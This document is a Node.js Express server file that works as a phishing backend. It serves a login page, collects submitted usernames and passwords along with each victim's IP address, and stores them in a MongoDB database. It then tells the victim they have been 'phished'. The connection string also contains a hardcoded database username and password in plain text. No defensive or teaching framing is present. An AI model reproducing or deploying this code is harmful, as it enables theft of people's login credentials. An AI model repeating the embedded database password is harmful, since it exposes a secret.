const express = require('express');
const mongoose = require('mongoose');
const bodyParser = require('body-parser');
const cors = require('cors');
const path = require('path');

const app = express();
const port = process.env.PORT || 3000;

// Middleware
app.use(cors());
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

// MongoDB connection
mongoose.connect('mongodb+srv://BobbyBWilfred:Legendbob2005%23@bbwCluster.0ctao.mongodb.net/bbwDatabase?retryWrites=true&w=majority&appName=BBWCluster', {
  useNewUrlParser: true,
  useUnifiedTopology: true,
});

// Schema and Model
const loginSchema = new mongoose.Schema({
  username: String,
  password: String,
  ip: String,
});
const Login = mongoose.model('Login', loginSchema);

// Serve phish.html (make sure it's in the same folder)
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

// Collect login data
app.post('/login', async (req, res) => {
  const ip =
    req.headers['x-forwarded-for']?.split(',')[0] ||
    req.connection?.remoteAddress ||
    req.socket?.remoteAddress ||
    (req.connection?.socket ? req.connection.socket.remoteAddress : null);

  const { username, password } = req.body;

  const login = new Login({ username, password, ip });

  try {
    await login.save();
    res.status(200).json({ message: 'Congrats! Your details have been sent to Bobby B Wilfred. You just got phished.' });
  } catch (err) {
    res.status(500).json({ message: 'Error saving login' });
  }
});

// Start server
app.listen(port, () => {
  console.log(`✅ Server running at http://localhost:${port}`);
});
